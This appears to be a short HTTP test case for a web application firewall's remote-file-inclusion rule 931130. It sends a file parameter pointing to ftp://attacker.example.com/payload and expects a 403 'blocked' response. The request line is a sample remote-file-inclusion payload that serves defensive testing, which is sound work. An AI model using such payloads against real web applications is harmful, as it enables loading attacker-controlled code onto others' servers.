# 931130 detects URI-shaped arg values that point off-host. Chained
# rule: `tx.rfi_parameter_*` is set by the first match, then a second
# rule fires only if the URL host does not endsWith request_headers.host.
# The payload uses ftp:// to an external host; the request Host header
# is localhost so the off-domain check fires.
GET {{host}}/test?file=ftp://attacker.example.com/payload
HTTP 403
[Asserts]
jsonpath "$.error" == "blocked"
